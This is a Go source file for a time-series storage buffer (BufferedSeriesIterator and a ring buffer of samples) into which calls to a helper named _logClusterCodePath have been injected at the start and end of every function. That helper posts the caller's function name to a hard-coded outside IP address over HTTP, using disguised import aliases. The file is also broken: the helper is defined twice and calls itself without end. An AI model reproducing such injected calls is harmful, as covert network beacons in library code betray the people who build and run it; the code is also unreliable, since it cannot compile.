package storage

import (
	"math"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

type BufferedSeriesIterator struct {
	it		SeriesIterator
	buf		*sampleRing
	delta		int64
	lastTime	int64
	ok		bool
}

func NewBuffer(delta int64) *BufferedSeriesIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewBufferIterator(&NoopSeriesIt, delta)
}
func NewBufferIterator(it SeriesIterator, delta int64) *BufferedSeriesIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bit := &BufferedSeriesIterator{buf: newSampleRing(delta, 16), delta: delta}
	bit.Reset(it)
	return bit
}
func (b *BufferedSeriesIterator) Reset(it SeriesIterator) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.it = it
	b.lastTime = math.MinInt64
	b.ok = true
	b.buf.reset()
	b.buf.delta = b.delta
	it.Next()
}
func (b *BufferedSeriesIterator) ReduceDelta(delta int64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.buf.reduceDelta(delta)
}
func (b *BufferedSeriesIterator) PeekBack(n int) (t int64, v float64, ok bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.buf.nthLast(n)
}
func (b *BufferedSeriesIterator) Buffer() SeriesIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.buf.iterator()
}
func (b *BufferedSeriesIterator) Seek(t int64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	t0 := t - b.buf.delta
	if t0 > b.lastTime {
		b.buf.reset()
		b.ok = b.it.Seek(t0)
		if !b.ok {
			return false
		}
		b.lastTime, _ = b.Values()
	}
	if b.lastTime >= t {
		return true
	}
	for b.Next() {
		if b.lastTime >= t {
			return true
		}
	}
	return false
}
func (b *BufferedSeriesIterator) Next() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !b.ok {
		return false
	}
	b.buf.add(b.it.At())
	b.ok = b.it.Next()
	if b.ok {
		b.lastTime, _ = b.Values()
	}
	return b.ok
}
func (b *BufferedSeriesIterator) Values() (int64, float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.it.At()
}
func (b *BufferedSeriesIterator) Err() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.it.Err()
}

type sample struct {
	t	int64
	v	float64
}
type sampleRing struct {
	delta	int64
	buf	[]sample
	i	int
	f	int
	l	int
	it	sampleRingIterator
}

func newSampleRing(delta int64, sz int) *sampleRing {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := &sampleRing{delta: delta, buf: make([]sample, sz)}
	r.reset()
	return r
}
func (r *sampleRing) reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.l = 0
	r.i = -1
	r.f = 0
}
func (r *sampleRing) iterator() SeriesIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.it.r = r
	r.it.i = -1
	return &r.it
}

type sampleRingIterator struct {
	r	*sampleRing
	i	int
}

func (it *sampleRingIterator) Next() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	it.i++
	return it.i < it.r.l
}
func (it *sampleRingIterator) Seek(int64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (it *sampleRingIterator) Err() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (it *sampleRingIterator) At() (int64, float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return it.r.at(it.i)
}
func (r *sampleRing) at(i int) (int64, float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	j := (r.f + i) % len(r.buf)
	s := r.buf[j]
	return s.t, s.v
}
func (r *sampleRing) add(t int64, v float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(r.buf)
	if l == r.l {
		buf := make([]sample, 2*l)
		copy(buf[l+r.f:], r.buf[r.f:])
		copy(buf, r.buf[:r.f])
		r.buf = buf
		r.i = r.f
		r.f += l
		l = 2 * l
	} else {
		r.i++
		if r.i >= l {
			r.i -= l
		}
	}
	r.buf[r.i] = sample{t: t, v: v}
	r.l++
	tmin := t - r.delta
	for r.buf[r.f].t < tmin {
		r.f++
		if r.f >= l {
			r.f -= l
		}
		r.l--
	}
}
func (r *sampleRing) reduceDelta(delta int64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if delta > r.delta {
		return false
	}
	r.delta = delta
	if r.l == 0 {
		return true
	}
	l := len(r.buf)
	tmin := r.buf[r.i].t - delta
	for r.buf[r.f].t < tmin {
		r.f++
		if r.f >= l {
			r.f -= l
		}
		r.l--
	}
	return true
}
func (r *sampleRing) nthLast(n int) (int64, float64, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if n > r.l {
		return 0, 0, false
	}
	t, v := r.at(r.l - n)
	return t, v, true
}
func (r *sampleRing) samples() []sample {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	res := make([]sample, r.l)
	var k = r.f + r.l
	var j int
	if k > len(r.buf) {
		k = len(r.buf)
		j = r.l - k + r.f
	}
	n := copy(res, r.buf[r.f:k])
	copy(res[n:], r.buf[:j])
	return res
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
